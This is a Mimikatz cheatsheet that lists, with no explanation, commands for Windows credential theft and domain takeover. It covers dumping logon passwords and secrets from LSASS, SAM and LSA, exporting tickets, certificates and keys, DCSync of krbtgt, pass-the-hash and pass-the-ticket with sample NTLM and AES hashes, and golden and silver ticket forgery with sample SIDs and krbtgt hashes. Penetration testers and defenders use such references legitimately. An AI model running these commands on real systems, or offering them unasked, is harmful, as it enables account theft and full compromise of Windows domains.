# Mimikatz-cheatsheet
Mimikatz cheatsheet

<p><br />#general<br />privilege::debug<br />log<br />log customlogfilename.log</p>
<p><br />#sekurlsa<br />sekurlsa::logonpasswords<br />sekurlsa::logonPasswords full<br />sekurlsa::tickets /export<br />sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd</p>
<p>#kerberos<br />kerberos::list /export<br />kerberos::ptt c:\chocolate.kirbi<br />kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi</p>
<p>#crypto<br />crypto::capi<br />crypto::cng<br />crypto::certificates /export<br />crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE<br />crypto::keys /export<br />crypto::keys /machine /export</p>
<p>#vault &amp; lsadump<br />vault::cred<br />vault::list<br />token::elevate<br />vault::cred<br />vault::list<br />lsadump::sam<br />lsadump::secrets<br />lsadump::cache<br />token::revert<br />lsadump::dcsync /user:domain\krbtgt /domain:lab.local</p>
<p>#pth<br />sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a<br />sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9<br />sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9<br />sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe</p>
<p>#ekeys<br />sekurlsa::ekeys</p>
<p>#dpapi<br />sekurlsa::dpapi</p>
<p>#minidump<br />sekurlsa::minidump lsass.dmp</p>
<p>#ptt<br />kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</p>
<p>#golden/silver<br />kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi<br />kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080<br />kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi</p>
<p>#tgt<br />kerberos::tgt</p>
<p>#purge<br />kerberos::purge</p>

